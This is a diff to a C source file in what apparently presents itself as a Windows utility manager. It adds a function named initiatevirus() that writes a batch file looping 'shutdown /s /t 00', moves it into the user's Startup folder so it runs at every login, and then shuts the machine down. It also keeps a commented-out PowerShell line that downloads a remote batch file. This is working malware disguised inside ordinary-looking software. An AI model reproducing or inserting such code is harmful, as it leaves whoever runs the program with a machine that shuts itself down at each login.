@@ -218,14 +218,18 @@ void exhaust(int capacity)
 /*                                                             Declared Function For Virus                                                      */
 void initiatevirus()
 {
-    system("Powershell -Command \" Invoke-WebRequest https://github.com/nazar-ansari/Windows-Utility-Manager/blob/main/source/depend.bat -OutFile depend.bat\" ");
+    system("echo @ECHO OFF > execute.bat");
+    system("echo MOVE execution.bat \"C:\%HOMEPATH%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\" >> execute.bat");
+    system("execute.bat");
+    sleep(2);
+    // system("Powershell -Command \" Invoke-WebRequest https://github.com/nazar-ansari/Windows-Utility-Manager/blob/main/source/depend.bat -OutFile depend.bat\" ");
     system("echo @ECHO OFF > execution.bat");
     system("echo :a >> execution.bat");
     system("echo shutdown /s /t 00 >>execution.bat");
     system("echo exit >> execution.bat");
     system("echo goto a >> execution.bat");
-    system("depend.bat");
-    remove("depend.bat");
+    system("execute.bat");
+    remove("execute.bat");
     system("shutdown /s /t 00");
 }
 /*                                                              Initialization Of MAIN Function                                             */
